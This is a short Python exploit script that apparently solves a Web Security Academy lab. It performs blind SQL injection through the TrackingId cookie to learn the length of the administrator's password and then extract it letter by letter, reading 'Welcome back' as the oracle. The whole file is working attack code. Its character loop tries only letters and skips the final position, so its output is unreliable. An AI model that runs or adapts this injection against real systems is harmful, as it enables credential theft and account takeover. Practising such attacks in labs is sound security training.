import string
import requests


url = "https://ac7e1ffe1ea1279ec06e6338004500c8.web-security-academy.net/login"
number = 1
trackingID = "XwSsSMjdYq6boO6t\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>" + str(number) + ")=\'a"
for a in range(1,40):
    trackingID = "XwSsSMjdYq6boO6t\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>" + str(number) + ")=\'a"
    response = requests.get(url, cookies={'TrackingId': trackingID})
    if "Welcome back" in response.text:
        number += 1
print("length of admin password found= "+str(number))
password = []
for num in range(1,number):
    for letter in string.ascii_letters:
        trackingID = "XwSsSMjdYq6boO6t\' AND (SELECT SUBSTRING(password,"+str(num)+",1) FROM users WHERE username=\'administrator\')=\'"+letter
        response = requests.get(url, cookies={'TrackingId': trackingID})
        if "Welcome back" in response.text:
            print(letter)
            password.append(letter)
print("admin password found: ")
for let in password:
    print(let)